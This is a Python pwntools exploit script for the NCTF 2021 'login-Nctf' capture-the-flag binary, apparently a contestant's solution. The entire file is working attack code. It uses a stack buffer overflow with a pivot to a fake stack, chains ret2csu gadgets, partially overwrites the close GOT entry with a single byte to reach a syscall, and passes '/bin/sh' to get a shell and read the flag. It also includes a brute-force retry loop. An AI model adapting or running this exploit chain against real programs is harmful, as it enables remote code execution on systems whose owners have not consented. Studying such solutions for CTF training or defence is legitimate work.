# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './login-Nctf'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def csu( call_addr ,rdi , rsi , rdx):
    pop_rbx_r15_ret = 0x40128A
    mov_call = 0x401270
    arg = flat(
        0 , 1 , rdi,
        rsi , rdx , call_addr,
    )
    return flat(pop_rbx_r15_ret , arg , mov_call) 

# one_gad = one_gadget(libc.path)

def attack():
    
    read_gadget = 0x4011ED
    fake_stack = 0x404090
    leave = 0x40121f
    close_got = elf.got['close']
# \x85
    read_got = elf.got['read']


#    0x4011ed    lea    rax, [rbp - 0x100]
#    0x4011f4    mov    edx, 0x110
#    0x4011f9    mov    rsi, rax
#    0x4011fc    mov    edi, 0
#    0x401201    call   read@plt <read@plt>

    payload = '\x00'*0x100 + p64(fake_stack + 0x100) + p64(read_gadget)
    
    sa('NCTF2021!' , payload)
    # dbg()

    payload = csu(read_got , 0 , close_got , 1)
    payload += csu(read_got , 0 , fake_stack + 0x120 , 0x60)
    payload += csu(close_got , fake_stack + 0x120 , 0 , 0)
    payload = payload.ljust(0x100 ,'\x00') + p64(fake_stack - 8) + p64(leave)

    # dbg()

    se( payload )
    se( '\x85' )
    se( '/bin/sh\x00'.ljust(59,'\x00') )
    # se('exec 1>&0')

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   login-Nctf.py
@Time    :   2021/12/03 23:39:49
@Author  :   Niyah 
'''